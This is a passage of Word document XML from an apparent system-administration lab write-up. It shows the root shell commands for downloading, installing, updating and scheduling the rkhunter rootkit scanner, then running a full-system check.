          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on on </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-14"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>.sh</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">6. Scan </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>em</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>for roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="14" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId82">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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId83">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>ttp:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>//</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>down</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>oads</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-2"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>so</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>u</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>cefor</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>g</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>e.net</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>p</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>ojec</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="2930"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>unter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>unter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1.4.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rkhunte</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1.4.2.ta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">.gz </w:t>
      </w:r>
      <w:hyperlink r:id="rId84">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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nz</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>hunte</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1.4.2.ta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">.gz </w:t>
      </w:r>
      <w:hyperlink r:id="rId85">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w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>tar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>xvf rk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>unt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">-1.4.2.tar </w:t>
      </w:r>
      <w:hyperlink r:id="rId86">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1.4.2]#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>cd rk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>unt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-11"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>-1.4.2/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="1846"/>
      </w:pPr>
      <w:hyperlink r:id="rId87">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rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nsta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>.sh --</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ayout defau</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>--</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sta</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">l </w:t>
      </w:r>
      <w:hyperlink r:id="rId88">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spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rkhunter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>--u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">date </w:t>
      </w:r>
      <w:hyperlink r:id="rId89">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spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>usr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rkhunter</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>--p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">opupd </w:t>
      </w:r>
      <w:hyperlink r:id="rId90">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rPr>
        <w:t>vi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>et</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on.da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rkh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">.sh </w:t>
      </w:r>
      <w:hyperlink r:id="rId91">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rPr>
        <w:t xml:space="preserve">chmod 755 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on.da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rkhunte</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">.sh </w:t>
      </w:r>
      <w:hyperlink r:id="rId92">
        <w:r>
          <w:t>[roo</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>t</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="1"/>
          </w:rPr>
          <w:t>@</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>oca</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>l</w:t>
        </w:r>
        <w:r>
          <w:t>host</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>rkhun</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">1.4.2]# </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>rk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>unt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>--check</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="19" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>checks</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ary</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
